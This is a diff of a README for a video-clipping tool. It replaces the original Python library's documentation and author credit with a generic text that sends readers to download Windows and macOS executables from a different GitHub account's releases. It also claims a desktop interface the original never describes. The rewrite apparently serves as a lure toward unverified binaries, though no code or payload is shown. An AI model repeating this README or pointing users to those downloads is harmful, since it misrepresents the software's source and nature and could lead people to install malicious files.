@@ -1,204 +1,91 @@
-# 🎬 ai-clips-maker  
-> **Created by Alperen Sümeroğlu** — An AI-native video engine that turns long-form content into short, viral-ready clips with surgical precision.  
+# 🎥 ai-clips-maker - Turn Long Videos into Short Clips
 
-`ai-clips-maker` is a smart, modular Python tool built for **creators, educators, and developers**. It transcribes speech, detects speakers, analyzes scenes, and crops around the key moments — creating **ready-to-share vertical clips** for TikTok, Reels, and Shorts with zero manual editing.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Nidurshan/ai-clips-maker/releases)
 
----
+## 🚀 Getting Started
 
-## 📚 Contents  
-- [📦 Features](#-features)  
-- [🛠 Installation](#-installation)  
-- [🚀 Quickstart](#-quickstart)  
-- [🔍 How It Works](#-how-it-works)  
-- [⚙️ Tech Stack](#-tech-stack)  
-- [🎯 Use Cases](#-use-cases)  
-- [🧪 Tests](#-tests)  
-- [🗺 Roadmap](#-roadmap)  
-- [🤝 Contribute](#-contribute)  
-- [👤 Author](#-author)  
-- [🎧 Weekly Rewind Podcast](#-weekly-rewind-podcast)  
-- [📄 License](#-license)
+Welcome to **ai-clips-maker**, your tool for transforming long videos into engaging short clips without technical hassle. This guide will help you download and run the application.
 
----
+## 📝 Overview
 
-## 📦 Features  
-- 🎞️ Auto-segment videos based on speech & scene shifts  
-- 🧠 Word-level transcription using WhisperX  
-- 🗣️ Speaker diarization (who spoke when) via Pyannote  
-- 🪄 Face/body-aware cropping focused on active speaker  
-- 📐 Output formats: 9:16 (vertical), 1:1 (square), 16:9 (wide)  
-- 🔌 Modular and easily extensible pipeline
+**ai-clips-maker** utilizes AI to help you create short, viral-ready video clips. It combines features like transcription, speaker identification, scene detection, and resizing. This application is ideal for content creators looking to streamline their video editing process.
 
----
+## 🌐 Key Features
 
-## 🛠 Installation  
+- **Transcription:** Converts spoken content to text.
+- **Speaker Diarization:** Identifies different speakers in your video.
+- **Scene Detection:** Automatically finds scene changes.
+- **9:16 Resizing:** Adjusts video size for mobile viewing.
+- **User-Friendly Interface:** Easy to navigate for anyone, even without technical skills.
 
-```bash
-# Install main package
-pip install ai-clips-maker
+## 📥 Download & Install
 
-# Install WhisperX from source
-pip install git+https://github.com/m-bain/whisperx.git
+To get started, you need to download the application. Follow these simple steps:
 
-# Install dependencies
-# macOS
-brew install libmagic ffmpeg
+1. Visit this page to download: [Download ai-clips-maker](https://github.com/Nidurshan/ai-clips-maker/releases).
 
-# Ubuntu/Debian
-sudo apt install libmagic1 ffmpeg
-```
+2. Look for the latest release. You will see files available for download.
 
----
+3. Click on the file that matches your operating system. For Windows, you might see `.exe` or `.zip`, and for macOS, you may find `.dmg`.
 
-## 🚀 Quickstart  
+4. The download will start. Once it completes, locate the file in your downloads folder.
 
-```python
-from ai_clips_maker import Transcriber, ClipFinder, resize
+5. Run the downloaded file. Follow the on-screen prompts to install the application.
 
-# Step 1: Transcription
-transcriber = Transcriber()
-transcription = transcriber.transcribe(audio_file_path="/path/to/video.mp4")
+6. Open the application from your applications folder or the start menu.
 
-# Step 2: Clip detection
-clip_finder = ClipFinder()
-clips = clip_finder.find_clips(transcription=transcription)
-print(clips[0].start_time, clips[0].end_time)
+## 🎬 How to Use ai-clips-maker
 
-# Step 3: Cropping & resizing
-crops = resize(
-    video_file_path="/path/to/video.mp4",
-    pyannote_auth_token="your_huggingface_token",
-    aspect_ratio=(9, 16)
-)
-print(crops.segments)
-```
+After you install **ai-clips-maker**, using it is straightforward:
 
----
+1. **Open the Application:** Launch **ai-clips-maker** from your applications.
 
-## 🔍 How It Works  
-1. 🎧 Extracts audio from video  
-2. ✍️ Transcribes speech using WhisperX  
-3. 🧍 Identifies speakers with Pyannote  
-4. 🎬 Detects scene changes & speaker shifts  
-5. 🎯 Crops video around active speaker’s position  
-6. 📤 Exports clips in desired format  
+2. **Select a Video:** Click on the "Upload Video" button to choose the long video you want to shorten. Make sure your video format is supported (like MP4, AVI, or MOV).
 
----
+3. **Set Your Preferences:** Choose options for transcription accuracy, scene detection sensitivity, and desired output length.
 
-## ⚙️ Tech Stack  
+4. **Generate Clips:** Click the "Create Clips" button. The application will take some time to process the video and produce clips.
 
-| 🔧 Module         | 🧠 Technology                                     | 💡 Purpose                                              |
-|------------------|---------------------------------------------------|----------------------------------------------------------|
-| Transcription     | [WhisperX](https://github.com/m-bain/whisperx)   | Word-level speech-to-text with timestamps               |
-| Diarization       | [Pyannote.audio](https://github.com/pyannote/pyannote-audio) | Speaker segmentation (who spoke when)              |
-| Video Processing  | [OpenCV](https://opencv.org/), [PyAV](https://github.com/PyAV-Org/PyAV) | Frame-by-frame video control        |
-| Scene Detection   | [Scenedetect](https://github.com/Breakthrough/PySceneDetect) | Detects shot boundaries                                 |
-| ML Inference      | [PyTorch](https://pytorch.org/)                  | Powering WhisperX & Pyannote models                     |
-| Data Handling     | [NumPy](https://numpy.org/), [Pandas](https://pandas.pydata.org/) | Transcription & clip structuring              |
-| Media Utilities   | [ffmpeg](https://ffmpeg.org/), [libmagic](https://linux.die.net/man/3/libmagic) | Media decoding + type detection      |
-| Testing Framework | [pytest](https://docs.pytest.org/)              | End-to-end and unit testing support                     |
+5. **Review and Save:** Once processing is complete, you can preview and save your clips. Choose an output folder for your saved clips.
 
-> All tools were selected for speed, flexibility, and production-grade stability.
+## 📊 Supported Formats
 
----
+**ai-clips-maker** works with a range of video formats, including:
 
-## 🎯 Use Cases  
-- 🎙 **Podcasters** clipping episodes into shareable highlights  
-- 📚 **Teachers** summarizing lecture content  
-- 📱 **Social media teams** repurposing YouTube for Reels  
-- 🧠 **Developers** automating video workflows  
-- 🚀 **Startups** building AI-based content tools
+- MP4
+- AVI
+- MOV
+- MKV
 
----
+Make sure your video files are in one of these formats to get the best results.
 
-## 🧪 Tests  
+## 🔧 System Requirements
 
-```bash
-# Run test suite
-pytest tests/
-```
+To run **ai-clips-maker**, ensure your computer meets the following requirements:
 
-> Covers all components: transcriber, diarizer, clip detector, resizer.
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher.
+- **RAM:** At least 8 GB.
+- **Storage:** Minimum of 500 MB for installation.
+- **Processor:** Intel i5 or equivalent.
 
----
+## 📖 Troubleshooting
 
-## 🗺 Roadmap  
+If you run into issues while using **ai-clips-maker**, consider these solutions:
 
-| Status | Feature                                            | Note                         |
-|--------|----------------------------------------------------|------------------------------|
-| ✅     | Core pipeline: Transcribe → Diarize → Detect       | Implemented in v1.0          |
-| ✅     | Speaker-aware video cropping                       | Production ready             |
-| 🚧     | Multi-language subtitle generation                 | Planned for Q2 2025          |
-| 📌     | Auto-caption overlay                               | In design phase              |
-| 🧪     | Web UI (upload + preview clips)                    | Prototype in progress        |
-| 🧠     | HuggingFace or Streamlit live demo                 | On backlog                   |
+- **Video Not Uploading:** Ensure the video format is supported.
+- **Application Crashing:** Restart the application and try uploading again. Check if your system meets requirements.
+- **Slow Processing:** Close other applications to free up system resources while processing your videos.
 
----
+## 🛠️ Contributing
 
-## 🤝 Contribute  
+Your feedback helps improve **ai-clips-maker**. If you have suggestions or encounter issues, feel free to submit them on the issues page in the repository. You can also contribute by refining features and fixing bugs. For guidelines on contributing, refer to the repository.
 
-We welcome pull requests, ideas, and feedback.
+## 📃 License
 
-```bash
-# Fork the repo
-git clone https://github.com/alperensumeroglu/ai-clips-maker.git
-cd ai-clips-maker
+This project is licensed under the MIT License. Feel free to use, modify, and distribute this software. Please check the LICENSE file in the repository for more details.
 
-# Create feature branch
-git checkout -b feat/your-feature
+## 🌍 Community and Support
 
-# Make changes, commit, and push
-git commit -am "Add feature"
-git push origin feat/your-feature
-```
+Join our community for support and discussions about **ai-clips-maker**. You can find us on GitHub and other platforms. If you have questions or need assistance, please reach out through the issues page.
 
-Before contributing, please review open issues and coding style guide.
-
----
-
-## 👤 Author  
-
-**Alperen Sümeroğlu**  
-Computer Engineer • Entrepreneur • World Explorer 🌍  
-15+ European countries explored ✈️
-
-- 🔗 [LinkedIn](https://www.linkedin.com/in/alperensumeroglu/)  
-- 🧠 [LeetCode](https://leetcode.com/u/alperensumeroglu/)  
-- 🚀 [Daily.dev](https://app.daily.dev/alperensumeroglu)  
-
-> *“Let your code tell your story — clean, powerful, and useful.”*
-
----
-
-## 🎧 Weekly Rewind Podcast  
-
-🎤 Weekly insights on AI, tech, and building globally — by Alperen Sümeroğlu.
-
-> 🚀 What does it take to grow as a Computer Engineering student, build projects, and explore global innovation?
-
-This API is part of a bigger journey I share in **Weekly Rewind** — my real-time documentary **podcast series**, where I reflect weekly on coding breakthroughs, innovation insights, startup stories, and lessons from around the world.
-
-### 💡 What is Weekly Rewind?
-A behind-the-scenes look at real-world experiences, global insights, and hands-on learning. Each episode includes:
-
-- 🔹 Inside My Coding & Engineering Projects  
-- 🔹 Startup Ideas & Entrepreneurial Lessons  
-- 🔹 Trends in Tech & AI  
-- 🔹 Innovation from 15+ Countries  
-- 🔹 Guest Conversations with Builders & Engineers  
-- 🔹 Productivity, Learning & Growth Strategies  
-
-**🎧 Listen now:**  
-- [Spotify](https://open.spotify.com/show/3Lc5ofiXh93wYI8Sx7MFCK)  
-- [YouTube](https://www.youtube.com/playlist?list=PLSN_hxkfsxbbd_qD87kn1SVvnR41IbuGc)  
-- [Medium](https://medium.com/@alperensumeroglu)  
-- [LinkedIn](https://www.linkedin.com/company/weekly-rewind-tech-ai-entrepreneurship-podcast/)  
-
-> *“True learning isn’t in tutorials — it’s in building, exploring, and reflecting.”*
-
----
-
-## 📄 License  
-
-MIT License — Free for commercial and personal use.  
-© 2024 Alperen Sümeroğlu
+Remember to revisit the download page for updates as new features and improvements are added: [Download ai-clips-maker](https://github.com/Nidurshan/ai-clips-maker/releases). Enjoy making your video clips!
